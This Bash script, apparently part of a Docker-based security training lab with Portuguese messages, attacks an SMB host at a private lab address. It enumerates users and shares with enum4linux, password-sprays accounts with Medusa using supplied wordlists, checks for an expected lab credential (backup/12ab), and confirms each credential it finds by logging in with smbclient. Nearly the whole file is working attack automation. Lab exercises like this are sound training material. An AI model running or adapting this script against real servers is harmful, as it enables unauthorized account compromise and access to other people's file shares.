#!/usr/bin/env bash
set -euo pipefail

SCRIPT_NAME="$(basename "$0" .sh)"
ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
LOG_DIR="$ROOT_DIR/logs"
mkdir -p "$LOG_DIR"
LOG_FILE="$LOG_DIR/${SCRIPT_NAME}-$(date +%Y%m%d-%H%M%S).log"
if [[ -e "$LOG_FILE" ]]; then
  LOG_FILE="${LOG_FILE%.log}-$$.log"
fi

START_TS=$(date +%s)

log() {
  printf '%s\n' "$*" | tee -a "$LOG_FILE"
}

finish() {
  local end_ts elapsed
  end_ts=$(date +%s)
  elapsed=$((end_ts - START_TS))
  log "$(printf 'Tempo total: %02d:%02d:%02d' \
    $((elapsed / 3600)) \
    $(((elapsed % 3600) / 60)) \
    $((elapsed % 60)))"
}
trap finish EXIT

usage() {
  cat >&2 <<'EOF'
Uso: 12-smb-attack.sh --users <arquivo> --spray <arquivo> [opcoes]

Opcoes:
  --host <ip>          Host SMB (padrao: 172.28.0.12)
  --output <path>      Log do Medusa dentro do Kali (padrao: /logs/medusa-smb-<timestamp>.log)
  --enum-output <path> Log do enum4linux no host (padrao: logs/enum4linux-smb-<timestamp>.log)
EOF
}

USERS=""
SPRAY=""
HOST="172.28.0.12"
STAMP="$(date +%Y%m%d-%H%M%S)"
OUTPUT="/logs/medusa-smb-${STAMP}.log"
HOST_OUTPUT="$ROOT_DIR/logs/$(basename "$OUTPUT")"
ENUM_OUTPUT="$ROOT_DIR/logs/enum4linux-smb-${STAMP}.log"

while [[ $# -gt 0 ]]; do
  case "$1" in
    --users)
      USERS="${2:-}"
      shift 2
      ;;
    --spray)
      SPRAY="${2:-}"
      shift 2
      ;;
    --host)
      HOST="${2:-}"
      shift 2
      ;;
    --output)
      OUTPUT="${2:-}"
      shift 2
      ;;
    --enum-output)
      ENUM_OUTPUT="${2:-}"
      shift 2
      ;;
    -h|--help)
      usage
      exit 0
      ;;
    *)
      log "ERRO: opcao desconhecida: $1"
      usage
      exit 1
      ;;
  esac
done

if [[ -z "$USERS" || -z "$SPRAY" ]]; then
  log "ERRO: --users e --spray sao obrigatorios"
  usage
  exit 1
fi

if [[ ! -f "$USERS" ]]; then
  log "ERRO: arquivo de usuarios nao encontrado: $USERS"
  exit 1
fi

if [[ ! -f "$SPRAY" ]]; then
  log "ERRO: arquivo de spray nao encontrado: $SPRAY"
  exit 1
fi

if [[ "$(docker inspect -f '{{.State.Running}}' lab-kali 2>/dev/null || true)" != "true" ]]; then
  log "ERRO: lab-kali nao esta em execucao; rode 09-kali-setup.sh primeiro"
  exit 1
fi

to_container_path() {
  local p=$1
  if [[ "$p" == "$ROOT_DIR/wordlists/"* ]]; then
    printf '/wordlists/%s' "${p#"$ROOT_DIR/wordlists/"}"
  elif [[ "$p" == wordlists/* ]]; then
    printf '/wordlists/%s' "${p#wordlists/}"
  elif [[ "$p" == /wordlists/* ]]; then
    printf '%s' "$p"
  else
    log "ERRO: o arquivo deve estar em wordlists/: $p"
    exit 1
  fi
}

USERS_C="$(to_container_path "$USERS")"
SPRAY_C="$(to_container_path "$SPRAY")"

log "== Ataque SMB: enumeracao e password spraying =="
log "Host: $HOST"
log "Usuarios: $USERS_C ($(wc -l < "$USERS") linhas)"
log "Spray: $SPRAY_C ($(wc -l < "$SPRAY") linhas)"
log "Log do Medusa: $OUTPUT"
log "Log do enum4linux: $ENUM_OUTPUT"

log "Executando enum4linux..."
if ! docker exec lab-kali enum4linux -U -S -P "$HOST" 2>&1 | tee "$ENUM_OUTPUT" | tee -a "$LOG_FILE"; then
  log "AVISO: enum4linux retornou codigo nao zero"
fi

SPRAY_LOG="$ROOT_DIR/logs/medusa-smb-spray-${STAMP}.log"
: > "$SPRAY_LOG"

log "Iniciando password spraying..."
while IFS= read -r pass; do
  [[ -z "$pass" ]] && continue
  [[ "$pass" == \#* ]] && continue

  log "Tentando senha: $pass"
  if ! docker exec lab-kali medusa \
    -h "$HOST" \
    -U "$USERS_C" \
    -p "$pass" \
    -M smbnt \
    -m GROUP:LOCAL \
    -m AUTH:LMv2 \
    -m MODE:AUTO \
    -t 1 \
    -v 4 \
    -O "$OUTPUT" 2>&1 | tee -a "$SPRAY_LOG" | tee -a "$LOG_FILE"; then
    log "AVISO: Medusa retornou codigo nao zero para a senha $pass"
  fi
done < "$SPRAY"

if [[ -f "$HOST_OUTPUT" ]]; then
  cat "$HOST_OUTPUT" >> "$SPRAY_LOG"
fi

FOUND="$(grep -E 'ACCOUNT FOUND' "$SPRAY_LOG" || true)"
if [[ -z "$FOUND" ]]; then
  log "ERRO: nenhuma credencial encontrada no spraying"
  exit 1
fi

log "Credenciais encontradas:"
printf '%s\n' "$FOUND" | tee -a "$LOG_FILE"

if printf '%s\n' "$FOUND" | grep -q 'User: backup' && printf '%s\n' "$FOUND" | grep -q 'Password: 12ab'; then
  log "OK: backup/12ab encontrado"
else
  log "AVISO: backup/12ab nao encontrado"
fi

log "Validando credenciais com smbclient..."
FAIL=0
while IFS= read -r line; do
  user="$(printf '%s\n' "$line" | sed -n 's/.*User: \([^ ]*\).*/\1/p')"
  pass="$(printf '%s\n' "$line" | sed -n 's/.*Password: \([^ ]*\).*/\1/p')"
  [[ -z "$user" || -z "$pass" ]] && continue

  if docker exec lab-kali smbclient "//$HOST/labshare" -U "$user%$pass" -c 'ls' >/dev/null 2>&1; then
    log "OK: validado $user"
  else
    log "ERRO: falha ao validar $user"
    FAIL=1
  fi
done <<< "$FOUND"

if ((FAIL)); then
  log "ERRO: uma ou mais credenciais nao foram validadas"
  exit 1
fi

log "== Ataque SMB concluido =="
